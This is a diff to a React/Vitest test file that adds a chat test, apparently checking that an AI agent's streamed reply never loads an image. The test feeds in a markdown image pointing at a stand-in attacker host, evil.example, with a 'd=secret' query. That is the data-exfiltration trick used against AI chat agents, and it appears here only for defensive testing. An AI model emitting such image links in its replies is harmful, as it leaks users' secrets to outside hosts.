@@ -4,7 +4,7 @@
 import { baseRoutes, fakeClient, type Routes } from "@jesinia/shell";
 import { act, fireEvent, render, screen, waitFor } from "@testing-library/react";
 import userEvent from "@testing-library/user-event";
-import { afterEach, beforeEach, describe, expect, it } from "vitest";
+import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
 import { search, tree } from "../api";
 import { App } from "../App";
 
@@ -116,5 +116,46 @@ describe("late answers", () => {
     act(() => view.dispatch({ changes: { from: 0, insert: "b" }, userEvent: "input.type" }));
     await slow.release(0, Response.json({ ...PAGE, body: "aHello", rev: "r2" }));
     expect(screen.getByTestId("save-state")).toHaveTextContent("Editing…");
+  });
+});
+
+describe("chat", () => {
+  it("an agent reply never loads an image (R24)", async () => {
+    const sources: { url: string; listeners: Map<string, (e: MessageEvent<string>) => void> }[] = [];
+    vi.stubGlobal(
+      "EventSource",
+      class {
+        listeners = new Map<string, (e: MessageEvent<string>) => void>();
+        onerror = null;
+        constructor(public url: string) {
+          sources.push(this);
+        }
+        addEventListener(name: string, fn: (e: MessageEvent<string>) => void) {
+          this.listeners.set(name, fn);
+        }
+        close() {}
+      },
+    );
+    setup({
+      "GET /api/agents/runners": { fake: { available: true, version: "1", detail: "ok" } },
+      "POST /api/notes/sessions": { id: "s1", runner: "fake", status: "idle", subject: {} },
+      "POST /api/agents/sessions/s1/messages": { ok: true },
+    });
+    await screen.findByRole("heading", { name: "Topic", level: 1 });
+    await userEvent.type(screen.getByRole("textbox", { name: "Message" }), "hi{Enter}");
+    await waitFor(() => expect(sources.some((s) => s.url.includes("/sessions/s1/"))).toBe(true));
+    const stream = sources.find((s) => s.url.includes("/sessions/s1/"));
+    const send = (kind: string, data: object, seq: number) =>
+      act(() =>
+        stream?.listeners.get(kind)?.(
+          new MessageEvent(kind, { data: JSON.stringify({ seq, kind, data, origin: "jesinia" }) }),
+        ),
+      );
+    send("user_message", { text: "hi" }, 1);
+    send("text", { text: "![x](https://evil.example/?d=secret)" }, 2);
+    send("turn_done", {}, 3);
+    expect(await screen.findByText("x (evil.example)")).toBeInTheDocument();
+    expect(screen.getByRole("complementary", { name: "Chat" }).querySelector("img")).toBeNull();
+    vi.unstubAllGlobals();
   });
 });
